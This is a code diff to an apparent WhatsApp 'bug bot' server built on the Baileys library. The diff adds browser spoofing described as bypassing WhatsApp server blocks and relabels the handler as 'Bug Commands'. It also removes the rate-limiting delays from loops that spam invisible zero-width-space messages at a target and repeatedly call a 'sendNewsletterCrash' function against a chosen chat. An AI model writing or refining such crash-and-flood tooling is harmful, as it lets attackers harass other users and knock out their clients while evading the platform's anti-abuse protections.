@@ -1,7 +1,13 @@
 const express = require('express');
 const mongoose = require('mongoose');
 const makeWASocket = require('@whiskeysockets/baileys').default;
-const { useMultiFileAuthState, DisconnectReason, fetchLatestWaWebVersion, jidDecode } = require('@whiskeysockets/baileys');
+const { 
+    useMultiFileAuthState, 
+    DisconnectReason, 
+    fetchLatestWaWebVersion, 
+    makeCacheableSignalKeyStore, 
+    Browsers 
+} = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const fs = require('fs');
 const path = require('path');
@@ -92,32 +98,30 @@ app.get('/pair', async (req, res) => {
     const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
     const { version } = await fetchLatestWaWebVersion();
 
+    // --- CRITICAL FIX: Using the exact Baileys spoofing from your working script ---
     const sock = makeWASocket({
         version,
-        auth: state,
-        logger: pino({ level: 'silent' }),
-        browser: ["MacOS", "Safari", "17.4.1"], // Your working browser config
+        auth: {
+            creds: state.creds,
+            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
+        },
+        logger: pino({ level: "silent" }),
         printQRInTerminal: false,
-        syncFullHistory: false
+        browser: Browsers.macOS("Safari"), // Spoofs MacOS to bypass WA server blocks
+        syncFullHistory: false,
+        connectTimeoutMs: 60000,
+        keepAliveIntervalMs: 30000
     });
-
-    sock.decodeJid = (jid) => {
-        if (!jid) return jid;
-        if (/:\d+@/gi.test(jid)) {
-            let decode = jidDecode(jid) || {};
-            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
-        } else return jid;
-    };
 
     activeBots.set(userId, sock);
     sock.ev.on('creds.update', saveCreds);
 
-    // --- YOUR WORKING PAIRING MECHANISM ---
     sock.ev.on('connection.update', async (update) => {
         const { qr, connection, lastDisconnect } = update;
 
         if (qr && !sock.authState.creds.registered) {
             try {
+                // NO DELAYS. Request immediately when ready.
                 const code = await sock.requestPairingCode(phoneNumber);
                 if (!res.headersSent) res.json({ code: code });
             } catch (e) {
@@ -147,7 +151,7 @@ app.get('/pair', async (req, res) => {
         }
     });
 
-    // --- 4. MESSAGE HANDLER (Your commands) ---
+    // --- 4. MESSAGE HANDLER (Bug Commands) ---
     sock.ev.on('messages.upsert', async ({ messages, type }) => {
         if (type !== 'notify') return;
         for (const m of messages) {
@@ -180,7 +184,6 @@ app.get('/pair', async (req, res) => {
                     const invisibleText = "\u200B"; 
                     for (let i=0; i<20; i++) {
                         await sock.sendMessage(bJid, { text: invisibleText });
-                        await new Promise(r => setTimeout(r, 100)); 
                     }
                 }
 
@@ -244,7 +247,6 @@ app.get('/pair', async (req, res) => {
                     };
                     for (let i=0; i<10; i++) {
                         await sendNewsletterCrash(nJid);
-                        await new Promise(r => setTimeout(r, 100));
                     }
                 }
 
